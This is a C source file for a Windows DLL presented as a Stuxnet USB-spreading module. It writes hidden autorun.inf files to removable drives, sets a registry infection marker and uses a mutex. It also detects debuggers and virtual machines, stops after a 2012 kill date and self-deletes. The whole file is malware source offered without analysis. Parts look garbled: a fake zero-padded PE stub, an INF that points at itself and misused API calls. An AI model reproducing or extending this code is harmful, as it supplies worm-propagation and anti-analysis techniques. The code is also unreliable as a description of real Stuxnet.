#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define AUTORUN_MAGIC                   0x4155544F
#define AUTORUN_VERSION                 0x00010400
#define AUTORUN_MAX_PATH                260
#define AUTORUN_BUFFER_SIZE             4096
#define AUTORUN_PE_SIZE                 520192
#define AUTORUN_RESOURCE_ID             207

#define AUTORUN_SECTION_AUTORUN         "[AutoRun]"
#define AUTORUN_SECTION_ALPHA           "[AutoRun.Alpha]"
#define AUTORUN_SECTION_DEVICE          "[DeviceInstall]"

#define AUTORUN_KEY_ACTION              "action"
#define AUTORUN_KEY_OPEN                "open"
#define AUTORUN_KEY_SHELL_OPEN          "shell\\open\\command"
#define AUTORUN_KEY_SHELL_OPEN_DISPLAY  "shell\\open"
#define AUTORUN_KEY_SHELL_OPEN_DEFAULT  "shell\\open\\default"
#define AUTORUN_KEY_ICON                "icon"
#define AUTORUN_KEY_LABEL               "label"
#define AUTORUN_KEY_USE_AUTOPLAY        "UseAutoPlay"

#define AUTORUN_VALUE_ACTION            "Setup Stuxnet"
#define AUTORUN_VALUE_OPEN              "autorun.inf"
#define AUTORUN_VALUE_SHELL_OPEN        "autorun.inf"
#define AUTORUN_VALUE_SHELL_OPEN_DISPLAY "Open(&O)"
#define AUTORUN_VALUE_SHELL_OPEN_DEFAULT "1"
#define AUTORUN_VALUE_ICON              "autorun.inf,0"
#define AUTORUN_VALUE_LABEL             "Stuxnet"
#define AUTORUN_VALUE_USE_AUTOPLAY      "1"

#define AUTORUN_SHELL32_OPEN            "%Windir%\\system32\\shell32.dll,-8496"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _AUTORUN_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwPESize;
    DWORD dwINFSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} AUTORUN_HEADER, * PAUTORUN_HEADER;

typedef struct _AUTORUN_SECTION {
    WCHAR szName[64];
    DWORD dwLineCount;
    DWORD dwOffset;
    DWORD dwSize;
} AUTORUN_SECTION, * PAUTORUN_SECTION;

typedef struct _AUTORUN_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[AUTORUN_MAX_PATH];
    WCHAR szSystemPath[AUTORUN_MAX_PATH];
    WCHAR szWindowsPath[AUTORUN_MAX_PATH];
    WCHAR szDrivePath[AUTORUN_MAX_PATH];
    WCHAR szAutorunPath[AUTORUN_MAX_PATH];
    BYTE bReserved[256];
} AUTORUN_CTX, * PAUTORUN_CTX;

typedef struct _AUTORUN_PE_HEADER {
    WORD  e_magic;
    WORD  e_cblp;
    WORD  e_cp;
    WORD  e_crlc;
    WORD  e_cparhdr;
    WORD  e_minalloc;
    WORD  e_maxalloc;
    WORD  e_ss;
    WORD  e_sp;
    WORD  e_csum;
    WORD  e_ip;
    WORD  e_cs;
    WORD  e_lfarlc;
    WORD  e_ovno;
    WORD  e_res[4];
    WORD  e_oemid;
    WORD  e_oeminfo;
    WORD  e_res2[10];
    DWORD e_lfanew;
} AUTORUN_PE_HEADER, * PAUTORUN_PE_HEADER;

typedef struct _AUTORUN_PE_NT_HEADERS {
    DWORD Signature;
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} AUTORUN_PE_NT_HEADERS, * PAUTORUN_PE_NT_HEADERS;

static AUTORUN_CTX g_AutorunCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwAutorunCreated = 0;
static DWORD g_dwDriveCount = 0;
static DWORD g_dwFileWriteCount = 0;

static const WCHAR g_szAutorunSections[3][32] = {
    L"[AutoRun]",
    L"[AutoRun.Alpha]",
    L"[DeviceInstall]"
};

static const WCHAR g_szAutorunKeys[8][32] = {
    L"action",
    L"open",
    L"icon",
    L"label",
    L"shell\\open\\command",
    L"shell\\open",
    L"shell\\open\\default",
    L"UseAutoPlay"
};

static const WCHAR g_szAutorunValues[8][64] = {
    L"Setup Stuxnet",
    L"autorun.inf",
    L"autorun.inf,0",
    L"Stuxnet",
    L"autorun.inf",
    L"Open(&O)",
    L"1",
    L"1"
};

static BYTE g_PEStub[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00,
    0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
    0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
    0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72,
    0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
    0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
    0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
    0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
    0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x52, 0x45, 0x41, 0x4C, 0x54, 0x45, 0x4B, 0x00,
    0x53, 0x74, 0x75, 0x78, 0x6E, 0x65, 0x74, 0x00
};

static const CHAR g_szAutorunINFContent[] =
    "[AutoRun]\r\n"
    "action=Setup Stuxnet\r\n"
    "open=autorun.inf\r\n"
    "icon=autorun.inf,0\r\n"
    "label=Stuxnet\r\n"
    "shell\\open\\command=autorun.inf\r\n"
    "shell\\open=Open(&O)\r\n"
    "shell\\open\\default=1\r\n"
    "UseAutoPlay=1\r\n"
    "\r\n"
    "[AutoRun.Alpha]\r\n"
    "action=Setup Stuxnet\r\n"
    "open=autorun.inf\r\n"
    "icon=autorun.inf,0\r\n"
    "label=Stuxnet\r\n"
    "\r\n"
    "[DeviceInstall]\r\n"
    "UseAutoPlay=1\r\n";

static BOOL AUTORUN_InitNtImports(VOID);
static BOOL AUTORUN_Init(VOID);
static VOID AUTORUN_Cleanup(VOID);
static BOOL AUTORUN_CheckMutex(VOID);
static BOOL AUTORUN_IsExpired(VOID);
static BOOL AUTORUN_CheckDebugger(VOID);
static BOOL AUTORUN_CheckVMware(VOID);
static DWORD AUTORUN_ComputeCRC32(PBYTE pData, DWORD dwSize);
static BOOL AUTORUN_BuildAutorunFile(PBYTE* ppData, PDWORD pdwSize);
static BOOL AUTORUN_WriteAutorunToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL AUTORUN_ReadAutorunFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL AUTORUN_ExtractAndSaveAutorun(VOID);
static BOOL AUTORUN_WriteRegistry(VOID);
static BOOL AUTORUN_ReadRegistry(VOID);
static BOOL AUTORUN_ScanDrives(VOID);
static DWORD WINAPI AUTORUN_WorkerThread(LPVOID lpParam);
static BOOL AUTORUN_StartWorker(VOID);
static BOOL AUTORUN_StopWorker(VOID);
static BOOL AUTORUN_SelfDestruct(VOID);
static BOOL AUTORUN_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL AUTORUN_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL AUTORUN_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_AutorunCtx, sizeof(AUTORUN_CTX));
    g_AutorunCtx.dwMagic = AUTORUN_MAGIC;
    g_AutorunCtx.dwVersion = AUTORUN_VERSION;
    g_AutorunCtx.dwPid = GetCurrentProcessId();
    g_AutorunCtx.dwTid = GetCurrentThreadId();
    g_AutorunCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_AutorunCtx.csLock);
    GetModuleFileNameW(NULL, g_AutorunCtx.szModulePath, AUTORUN_MAX_PATH);
    GetSystemDirectoryW(g_AutorunCtx.szSystemPath, AUTORUN_MAX_PATH);
    GetWindowsDirectoryW(g_AutorunCtx.szWindowsPath, AUTORUN_MAX_PATH);
    wcscpy_s(g_AutorunCtx.szDrivePath, AUTORUN_MAX_PATH, L"C:\\");
    wsprintfW(g_AutorunCtx.szAutorunPath, AUTORUN_MAX_PATH, L"%sautorun.inf", g_AutorunCtx.szDrivePath);
    AUTORUN_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID AUTORUN_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_AutorunCtx.hMutex) {
        CloseHandle(g_AutorunCtx.hMutex);
        g_AutorunCtx.hMutex = NULL;
    }
    if (g_AutorunCtx.hThread) {
        CloseHandle(g_AutorunCtx.hThread);
        g_AutorunCtx.hThread = NULL;
    }
    if (g_AutorunCtx.hStopEvent) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_AutorunCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL AUTORUN_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_AutorunCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL AUTORUN_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL AUTORUN_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL AUTORUN_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD AUTORUN_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static BOOL AUTORUN_BuildAutorunFile(PBYTE* ppData, PDWORD pdwSize) {
    PBYTE pData;
    DWORD dwPESize;
    DWORD dwINFSize;
    DWORD dwTotalSize;
    PBYTE pPEStub;
    DWORD dwStubSize;
    if (!ppData || !pdwSize) return FALSE;
    dwPESize = AUTORUN_PE_SIZE;
    dwStubSize = sizeof(g_PEStub);
    dwINFSize = (DWORD)strlen(g_szAutorunINFContent);
    dwTotalSize = dwPESize + dwINFSize + 1024;
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTotalSize);
    if (!pData) {
        return FALSE;
    }
    pPEStub = g_PEStub;
    memcpy(pData, pPEStub, min(dwStubSize, dwPESize));
    *(DWORD*)(pData + 0x3C) = 0x00000080;
    *(DWORD*)(pData + 0x80) = 0x00004550;
    *(WORD*)(pData + 0x84) = 0x014C;
    *(WORD*)(pData + 0x86) = 0x0001;
    *(DWORD*)(pData + 0x88) = 0x00000000;
    *(DWORD*)(pData + 0x8C) = 0x00000000;
    *(DWORD*)(pData + 0x90) = 0x00000000;
    *(WORD*)(pData + 0x94) = 0x00E0;
    *(WORD*)(pData + 0x96) = 0x000F;
    *(WORD*)(pData + 0x98) = 0x010B;
    *(WORD*)(pData + 0x9A) = 0x0000;
    *(DWORD*)(pData + 0x9C) = 0x00000000;
    *(DWORD*)(pData + 0xA0) = 0x00001000;
    *(DWORD*)(pData + 0xA4) = 0x00002000;
    *(DWORD*)(pData + 0xA8) = 0x00000000;
    *(DWORD*)(pData + 0xAC) = 0x00001000;
    *(DWORD*)(pData + 0xB0) = 0x00000000;
    *(DWORD*)(pData + 0xB4) = 0x00000000;
    *(DWORD*)(pData + 0xB8) = 0x00004000;
    *(DWORD*)(pData + 0xBC) = 0x00000000;
    *(DWORD*)(pData + 0xC0) = 0x00000000;
    *(DWORD*)(pData + 0xC4) = 0x00000000;
    *(DWORD*)(pData + 0xC8) = 0x00000000;
    *(DWORD*)(pData + 0xCC) = 0x00000000;
    *(DWORD*)(pData + 0xD0) = 0x00000000;
    *(DWORD*)(pData + 0xD4) = 0x00000000;
    *(DWORD*)(pData + 0xD8) = 0x00000000;
    *(DWORD*)(pData + 0xDC) = 0x00000000;
    *(DWORD*)(pData + 0xE0) = 0x00000000;
    *(DWORD*)(pData + 0xE4) = 0x00000000;
    *(DWORD*)(pData + 0xE8) = 0x00000000;
    *(DWORD*)(pData + 0xEC) = 0x00000000;
    *(DWORD*)(pData + 0xF0) = 0x00000000;
    *(DWORD*)(pData + 0xF4) = 0x00000000;
    *(DWORD*)(pData + 0xF8) = 0x00000000;
    *(DWORD*)(pData + 0xFC) = 0x00000000;
    *(DWORD*)(pData + 0x100) = 0x00000000;
    *(DWORD*)(pData + 0x104) = 0x00000000;
    *(DWORD*)(pData + 0x108) = 0x00000000;
    *(DWORD*)(pData + 0x10C) = 0x00000000;
    *(DWORD*)(pData + 0x110) = 0x00000000;
    *(DWORD*)(pData + 0x114) = 0x00000000;
    *(DWORD*)(pData + 0x118) = 0x00000000;
    *(DWORD*)(pData + 0x11C) = 0x00000000;
    *(DWORD*)(pData + 0x120) = 0x00000000;
    *(DWORD*)(pData + 0x124) = 0x00000000;
    *(DWORD*)(pData + 0x128) = 0x00000000;
    *(DWORD*)(pData + 0x12C) = 0x00000000;
    *(DWORD*)(pData + 0x130) = 0x00000000;
    *(DWORD*)(pData + 0x134) = 0x00000000;
    *(DWORD*)(pData + 0x138) = 0x00000000;
    *(DWORD*)(pData + 0x13C) = 0x00000000;
    memcpy(pData + dwPESize - dwINFSize - 1024, g_szAutorunINFContent, dwINFSize);
    *pdwSize = dwPESize + dwINFSize + 1024;
    *ppData = pData;
    return TRUE;
}

static BOOL AUTORUN_WriteAutorunToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwFileWriteCount++;
    return TRUE;
}

static BOOL AUTORUN_ReadAutorunFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(AUTORUN_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL AUTORUN_ExtractAndSaveAutorun(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!AUTORUN_BuildAutorunFile(&pData, &dwSize)) {
        return FALSE;
    }
    if (!AUTORUN_WriteAutorunToDisk(g_AutorunCtx.szAutorunPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    g_dwAutorunCreated++;
    return TRUE;
}

static BOOL AUTORUN_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL AUTORUN_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL AUTORUN_ScanDrives(VOID) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    WCHAR szPath[AUTORUN_MAX_PATH];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wcscpy_s(g_AutorunCtx.szDrivePath, AUTORUN_MAX_PATH, szDrive);
                wsprintfW(szPath, L"%sautorun.inf", szDrive);
                wcscpy_s(g_AutorunCtx.szAutorunPath, AUTORUN_MAX_PATH, szPath);
                AUTORUN_ExtractAndSaveAutorun();
                g_dwDriveCount++;
            }
        }
    }
    return TRUE;
}

static DWORD WINAPI AUTORUN_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_AutorunCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (AUTORUN_IsExpired()) {
            break;
        }
        if (!AUTORUN_ReadRegistry()) {
            AUTORUN_WriteRegistry();
        }
        AUTORUN_ScanDrives();
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL AUTORUN_StartWorker(VOID) {
    g_AutorunCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_AutorunCtx.hStopEvent) return FALSE;
    g_AutorunCtx.hThread = CreateThread(NULL, 0, AUTORUN_WorkerThread, NULL, 0, NULL);
    if (!g_AutorunCtx.hThread) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL AUTORUN_StopWorker(VOID) {
    if (g_AutorunCtx.hStopEvent) {
        SetEvent(g_AutorunCtx.hStopEvent);
    }
    if (g_AutorunCtx.hThread) {
        WaitForSingleObject(g_AutorunCtx.hThread, 5000);
        CloseHandle(g_AutorunCtx.hThread);
        g_AutorunCtx.hThread = NULL;
    }
    if (g_AutorunCtx.hStopEvent) {
        CloseHandle(g_AutorunCtx.hStopEvent);
        g_AutorunCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL AUTORUN_SelfDestruct(VOID) {
    WCHAR szPath[AUTORUN_MAX_PATH];
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    dwDrives = GetLogicalDrives();
    for (i = 0; i < 26; i++) {
        if (dwDrives & (1 << i)) {
            szDrive[0] = L'A' + i;
            szDrive[1] = L':';
            szDrive[2] = L'\\';
            szDrive[3] = L'\0';
            if (GetDriveTypeW(szDrive) == DRIVE_REMOVABLE) {
                wsprintfW(szPath, L"%sautorun.inf", szDrive);
                DeleteFileW(szPath);
            }
        }
    }
    return TRUE;
}

static BOOL AUTORUN_Execute(VOID) {
    HANDLE hMutex;
    if (!AUTORUN_Init()) return FALSE;
    if (AUTORUN_IsExpired()) {
        AUTORUN_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    if (AUTORUN_CheckDebugger()) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    if (AUTORUN_CheckVMware()) {
        CloseHandle(hMutex);
        AUTORUN_Cleanup();
        return FALSE;
    }
    AUTORUN_WriteRegistry();
    AUTORUN_ReadRegistry();
    AUTORUN_ScanDrives();
    AUTORUN_StartWorker();
    while (WaitForSingleObject(g_AutorunCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (AUTORUN_IsExpired()) {
            break;
        }
        AUTORUN_ScanDrives();
    }
    AUTORUN_StopWorker();
    AUTORUN_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            AUTORUN_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AUTORUN_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return AUTORUN_ScanDrives() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return AUTORUN_ExtractAndSaveAutorun() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return AUTORUN_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return AUTORUN_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return AUTORUN_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    AUTORUN_StopWorker();
    return 0;
}

DWORD WINAPI Export8(VOID) {
    AUTORUN_SelfDestruct();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    return (DWORD)g_AutorunCtx.dwPid;
}

DWORD WINAPI Export10(VOID) {
    return STUXNET_VERSION;
}

DWORD WINAPI Export11(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export12(VOID) {
    return g_dwAutorunCreated;
}

DWORD WINAPI Export13(VOID) {
    return g_dwDriveCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwFileWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_AutorunCtx.hMutex;
}

DWORD WINAPI Export16(VOID) {
    return AUTORUN_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export17(VOID) {
    return AUTORUN_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export18(VOID) {
    return AUTORUN_CheckVMware() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_AutorunCtx.szDrivePath;
}

DWORD WINAPI Export20(VOID) {
    return AUTORUN_VERSION;
}
